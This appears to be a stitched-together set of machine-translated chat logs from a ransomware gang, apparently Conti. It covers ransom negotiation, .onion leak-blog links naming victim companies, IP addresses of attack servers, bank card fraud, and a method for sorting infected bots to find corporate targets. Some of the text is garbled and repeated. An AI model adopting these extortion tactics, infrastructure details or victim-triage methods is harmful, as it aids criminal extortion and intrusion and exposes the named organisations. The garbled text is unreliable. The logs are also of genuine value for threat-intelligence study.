like 8-9 million and let them fuck off.

However, 900,000 USD is not a satisfying offer either. We said our word - we are not interested in such a numbers. Try your best and raise it to a numberwith 7 zeroes minimum.
number close to 7 zeroes
not
Let's not shoot them down.
Let them bend.
Okay. .
There's just one problem.
They're almost out of time
and Trump won't say a word
They'll be published automatically in two days.

[19:07:36] <tramp@q3mcco35auwcstmt.onion> we are not interested in this figure
[19:07:40] <fire> +++
[19:07:54] <tramp@q3mcco35auwcstmt.onion> we're waiting for 7 zeros
[19:07:56] <fire> and like well you know you're fucked)
[19:08:04] <tramp@q3mcco35auwcstmt.onion> I'm telling you we'll go all the way with them
[19:08:09] <tramp@q3mcco35auwcstmt.onion> we won't give in at all
this weekend.
clearly
then 7k and fuck it.
I mean 10k.
yeah, easy
You're good to go.
They're giving away a thousand bucks right off the bat.
What bank? That's important.
So yes, if they had given me 300k I would probably go nuts and shut down the chat room
fight to the end with mailfly?
then the deadline is necessary
Damn, the deadline has to be postponed somehow
i hope they ask for it themselves
otherwise it's a fucked up situation.
Yeah, they should.
We'll remind them tomorrow.
Okay. .
there's 24 hours left.
Mm-hmm.
What did I write?
I can do that.
Remind me in advance then.
or tomorrow's supposed to be btz

 Axsis Bank
but
you were away for a week, and the guy has already passed it all on to Zeus and his team ...
ok)
I'm not worried)
they will try if it does not work out - can be directed at you?
Are you even interested?
it's just that there's another bank
in kosovo :)
depends on the bank
for the unlimits you can try
That's why I asked.
You need to see if there is a card issuance
what I wrote.
you know what else i think? they all these three big ones can burn out after the holidays
Uh-huh.
and just don't fucking get in touch anymore
Axsis, icic, sidb and pnb maybe
[19:30:24] <mango> )
[19:30:30] <cert@q3mcco35auwcstmt.onion> )
[19:30:31] <mango> that is not 1 bank by Indians but 3
[19:30:38] <cert@q3mcco35auwcstmt.onion> 4
that's the kind of guys... if you're interested in the topic of banks at all I'll translate to you in the future...
i was just slowing them down as much as i could, but they were already under deadline so i gave them zeus...
i'll talk to my friend who's been fucking around with the banks
it's been hard enough out there 'cause of the fuckin' unlimits lately.
I ain't getting no messages from you.
i suggest you give them a little leeway now
and say 25k
since it's 29 so much)
[20:14:45] <veron> yeah give me the hashes

So, are we getting the shells version ready and running?
I also realized that now you can't give appinstaller with random name, because it affects the envelope)

someone must have leaked the information from the old chat room
This blog needs to be redesigned so no one can see it from this link and give them a separate one
I'm deleting it now.

I didn't do anything wrong.
Don't fucking yell at me.
Someone leaked it from them.
Hey, is everybody here?
hello
I need the HlS.
I didn't do anything wrong.
Don't fucking yell at me.
Somebody leaked it from them.
Yeah, I didn't get it. Sorry.
I deleted the blog.
I made a new one.
I thought you were messing up again. I've been there before.
Of course I did.
I'm the scapegoat.
It's good that you apologized, otherwise I thought I'd give up and leave.
The blog is fucked up.
impossible to log in, impossible to do anything
we had a fucking panic yesterday with skippy.
i could barely move the timer, it would have been a fiasco.
you can spit and leave - we'll continue to blog on our own, I have my hands free here !
you just don't need to get ahead of yourself.
figure it out first.
I can't get in either.
Okay.
Just don't get ahead of yourself.
- You don't get it right, you apologize.
Imagine yesterday's situation.
You've already had this kind of thing done to you
It was
I promised you that it will not happen again
And it wasn't my fault.
I didn't know about the time
Now I've taken it all into account.
I need to fix the situation with the blog
Now I'm doing the OTTAWA.
This is fucked up.
It's been three fucking hours.
no patience, no energy.
I know what the problem is.
and i told the cyber about it, but he's in no hurry to fix it
I made a new chat room for Ottawa
I'll give them a number there.
How are we going to send it to them?
I asked them for a box.
They said they'd send it over today.
Did you see that?
They're gonna send it?
hello. i agreed with mango a couple of weekends extra because i got sick and my computer broke down, all sorts of stuff all at once piled up( do not lose that if anything in a day or two i think i will get in touch as it gets easier
and i don't know what blog you deleted????
I think I have all my blogs in place.
Oh, you're using a prft.
I see
[09:24:52] <tramp> today they said they'll send it - what will they send us today?
yesterday, by the way, the lawyer was very good, he helped us very intelligently with the texts
Still, you have to hire a lawyer somewhere.
Yes, and for LL_Main, yesterday with Skippy on the meeting, most likely more than 5k we can not squeeze them. what do you think about it?
I wrote you in the off, the man for tomorrow if that will come for an interview. I'll let you know what time it is.
Hi
All right, I'll wait.
[09:24:28] <tramp> I've made a new chat room for ottawa - ok, give me a heads up too in case you miss it again
hi, is everyone found?
by the way, i'll be blogging to them by 10.01.22. i think it'll be ok
and text me when you're free, there's something else we need to discuss
Yes, one more thing, on the LL_Main, yesterday with the Skippy to consult, rather more than 5k we can not squeeze them. what do you think about it?
we'll see.
[09:24:28] <tramp> for ottawa made a new chat room - ok, and give me some pointers in case you disappear again
i'll do it myself don't worry
I slept for two days.
cleaned everything up
etc.
and let me know when you're free, there's one more thing to discuss
What's that?
We have all the chat blogs, which are now in conversation, the timer is to 23.59 31.12.2021. Right into the new year they will be published. With the problems with the blog, pulling until that time is creepy. Therefore, I must understand what to do on the 30th, as 31, if I will be online, it is extremely small.
Until January 7 everyone will be prolonged
So that all would be quiet.
+
today straight
MAILFLY_2 - also and need to make a new blog on them
or 30
They deleted the old one yesterday.
who deleted?
my blog did not load last night from direev and he deleted
or 30 - you will not forget ?
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/zTnGsBmj_Acuity_Brands
it would be better to have 30 all transferred.
It's still there.
No one deleted anything.
and if the blog will not load again?)
so until the 30th let him decide
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/gQ1ZfJba_Shutterfly_Inc
You're confused.
why was this one deleted in the first place? it was fine.
with Shutterfly_Inc ?
yeah
I forgot to tell you...lost Burana, if he's your guy and you're in touch with him - let him write something back
I've moved it to the New Year's Eve.
i'm paying his guys for just sitting around...
You don't get it, do you?
what do you mean?
Trump, tell me.
did you see that they were dumped from the old chat room?
and know the link to their old blog ?

What's this for?
I didn't see a link.
Yeah.
so they won't be compromised.
That makes sense.
They need to make a new one and only give them a link to the blog
I think they did it on purpose
The old chat room was cleaned and leaked to them
Yeah
I think that's their strategy.
With the problems with the blog as it is now very difficult to do anything
It just hangs there.
You have someone doing blogs now?
I do not know whether it is related to this or not, but the blog began to hang as a new server connected to the 25tb. and as I noticed after that became difficult to log in and further work on the blog. need to check it, just turn off this server and see how the blog will work.
you have someone doing blogs now??? - yes i myself can start doing blogs with the helpdesk who directly date from the taggers sits. we have a lot of free time now
off
I've got a blog hanging in there, too.

Trampych, hi. I do not know if we will cross with you before the New Year or not, so briefly: all I have on the blog until January 7, as with you and discussed earlier. Today I won't be long, because I'm getting ready and planning a departure in the evening for 700 km, the road is not close and the fucking snow...the case is short). Tomorrow will still appear in chats to close tails, if any. After N.G. I'll probably come and first thing I'll buy a car))), since the fall in the bitcoin I don't have enough money for a square. Well, Happy New Year to you and your family, all your good wishes, happiness and good luck in the coming year, more children's laughter, less tears, because for the sake of that we fuck with you and here. If anything, write here, I'll periodically appear as far as possible and respond to your cries))
ok
Get well
hey! let me give you a salary
hey, come on :D

Came across an article on Codeby.net forum today. The article itself is about the exploit "how did it happen? Log4shell". And the article starts like this:

While the Conti material is being prepared ...

So I'm pretty sure that this is the guy who leaked us. We need to find some acquaintances urgently, who are friends with the admins of this Codeby.net
If he leaked something about our structure, or coders ... forum is pretty well known, all information will fly around the moment ... :)

Hi. please look, there is a very strange thing going on in the chats. someone dumped unknown files to three companies at once and at about the same time. I'm sure it's outsiders not belonging to these companies, possibly intelligence services. I have not touched them and did not write a response to them, so look yourself in the virtual, I feel a trick here, either a virus or something else.

I can't fucking see you.
[11:09:18] <pumba> are everyone's files the same?
[11:09:21] <cybergangster> not all
[11:09:27] <cybergangster> there's a note in the file itself
[11:09:41] <cybergangster> every chat room has a different one
[11:09:45] <pumba> and what does it say?
[11:09:53] <cybergangster> locker note
[11:10:03] <cybergangster> readme.txt
[11:10:18] <cybergangster> the question is where did it go there or did somebody send it or is it a bug
[11:10:23] <cybergangster> we're working on it now
[11:10:27] <pumba> okay
[11:10:57] <pumba> just suspiciously three companies at the same time
[11:11:05] <pumba> Could it be a coincidence
[11:11:17] <cybergangster> there are not 3
[11:11:19] <cybergangster> even more
[11:11:25] <cybergangster> not only trampap
[11:11:30] <pumba> aah
[11:11:48] <pumba> and one company never contacted before
[11:11:54] <pumba> it's weird
[11:12:20] <pumba> I had a second thought that the panel was fucked
[11:12:47] <cybergangster> no
[11:12:54] <cybergangster> if it was fucked they would sit quietly and watch
[11:13:23] <pumba> in the other panels that aren't at tramp, are the times about the same too?
[11:13:41] <cybergangster> yeah like 9 hours ago
[11:13:46] <pumba> well
[11:13:54] <pumba> it was around the same time
[11:14:04] <pumba> that's fucking suspicious
all right, we got the gangster.

3rd module dispenser 46.19.136.221 and two module servers 142.4.211.167 31.14.40.173
esteban (devil) servers:
1) news server 195.123.221.248
2) sftp server for file storage 37.187.24.215
3) dedicat for cryptopanel 5.34.181.18
4) my previous roaming default gateway, it is still in use, I will have to remove it soon
5) 5) wind vpc for builds 194.76.225.152
backup set:
1) cryptopanel 213.252.245.181 under Linux
2) for builds of wind binary 2.56.10.41
You also need 5th server for crypto chat (will be separate from cryptopanel)
ie, one set: 1) crypto chat 2) cryptopanel 3) news site 4) wind for builds 5) sftp for files
plus, we're keeping the previous cryptopanel server for now
esteban said that he is opening a new project, and it will need the second set of 5 servers: 1) crypto chat 2) cryptopanel 3) news site 4) vinda for builds 5) sftp for files
plus two more backup servers for 1) cryptochat and 4) vinda for the second project's builds
i.e., 7 more servers will be needed
I have not ordered them yet
then there's a Redmine server for silver 185.64.106.247
and my backup server: 217.12.201.132
These are all the servers I'm renewing.
i.e. about 50 pcs of vpns and dedicles, not counting vpns for hors gamend, and 6 third party vpns from aprovpn
half I renew around the 10th and the other half around the 23rd
25 grand or so at a time.
25 grand to renew takes all day.
if i have to give you one more at a time to pay, it will take a few days

hi
have you closed the admins yet?
 [17:51:25] <best> hi
did you close the admins for now?
Hi, I don't have anyone working on the project,

resolve the issue
Hi, I have no one working on the project,

resolve the issue
[18:01:55] <veron> [18:01:11] <veron> hi, I've been told to close access to all but two people
[18:02:04] <veron> there are about 4-5k new bots
[18:02:16] <veron> and no one did anything, all disappear
ping
from admin in work now 7 networks, mostly asia they all
I've been downloading about 6k all week, at least someone would come
it's not up to me.

I've been asked to
everyone close and open for 2 people, and they do not work unfortunately )
I was definitely there this week, you can see from the tascas)
I seldom delete the boards.
was it Bentley who asked for it?)
no stern
ping
ping
Okay, I'll find out why.
at least give me a heads up)
Yeah I don't mind, as long as they all work
US about 1k bots and ka
was
it's not a complaint to you if anything)
It's ok.
I understand that they said to close, you closed)
it's a week you poured 1k?)
We have until Monday to decide.

on monday it will be even more powerful
I was in the admin office on the 17th sort of, did not see yusa and canada there domain bots
total of 6k bots, yusi like about 1k
с 18
i'm uploading a mix of bots needed for spam
and there's some domains out there.
waiting for an answer from Bentley
I need to solve the issue with the host and domains to host my installer
how can you tell if the bot is good ?
Domain: 6eves.net
here for example
or here

Domain: tonkin.com
Domain: DealermineCorp.dealermine.com
here's the new one
Domain: AMERICANBOILER.local
Domain: ocscd.owenscollision.com
I select based on 3 main criteria
1. The presence of the domain + search the Internet for any company with a given domain
2. Checking the list of processes (if it's a zapozak, the list of processes is unlikely to be 15 pieces, usually much more) (if a server, there are many possible)
3. boot and more accurate preview of what's going on and how
[18:24:43] <veron> Domain: DealermineCorp.dealermine.com
it's 100% corp

Domain: tonkin.com
It is possible corporate, but it is necessary to look at the list of processes. there is such a company, but it can be masked by analysts. if the processes are normal - prozruz and already further collection of information

[18:25:46] <veron> Domain: ocscd.owenscollision.com
Corp exactly

[18:25:30] <veron> Domain: AMERICANBOILER.local
looks like a corp, but again, you have to look more precisely
ok
and other things)
generally the domain + process list gives a good indication if it is corp or not.
but if in doubt, you need to check more precisely.

I also sometimes look at ipconfig or just the list of processes, because there may be VPN products running
Then it may be that the user is corporate, but currently disconnected from the corporate VPN and that's it)
Then I mark it in my browser and upload it last
Domain: corp.hrspinner.com
I have to process them quickly
there are a couple of people in the team who are free, but it is not clear yet with stern and closed admin
so i don't know what to do or how to do it at all)
I just want to find out from him why only two teams opened admin)
Domain: office.dentontownship-mi.org
